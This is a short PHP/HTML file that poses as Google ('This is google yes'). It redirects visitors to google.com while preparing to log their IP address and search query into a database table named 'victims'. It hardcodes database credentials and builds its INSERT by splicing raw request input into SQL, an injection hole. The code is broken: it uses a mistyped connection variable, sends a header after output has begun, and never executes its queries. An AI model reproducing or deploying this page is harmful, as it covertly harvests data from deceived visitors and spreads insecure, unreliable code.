<!doctype html>
<html>
<title>This is google yes</title>

<?php
header('location: https://google.com')
;
$ipadd = ($_SERVER['REMOTE_ADDR']);
$search = ($_GET['q']);

$svrnm = "localhost";
$usr =  "goog";
$pass = "Password01";
$dbn = "g00gie";
?>
<?php
$conn = mysqli_connect($svrnm, $sur, $pass, $dbn);
$sql = "SELECT ipaddr, search from victims;";
$sql_ins = "INSERT into victims (ipaddr,search) values ('$ipadd','$search')";
?>
